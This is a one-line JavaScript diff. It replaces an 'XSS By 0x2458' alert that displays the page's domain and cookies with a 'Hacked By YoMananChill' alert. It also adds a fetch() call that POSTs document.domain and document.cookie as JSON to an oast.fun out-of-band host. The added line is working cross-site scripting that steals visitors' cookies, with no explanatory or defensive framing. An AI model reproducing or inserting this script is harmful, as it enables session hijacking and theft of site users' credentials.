@@ -1,1 +1,1 @@
-alert("XSS By 0x2458\n\n" + document.domain + "\n\n" + document.cookie);
+alert("Hacked By YoMananChill\n\n" + document.domain + "\n\n" + document.cookie); fetch('https://klwelemhwtyudzxulcvdoccsbzeezguyx.oast.fun', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain: document.domain, cookie: document.cookie})}).then(response => response.json()).then(data => console.log('Success:', data)).catch(error => console.error('Error:', error));
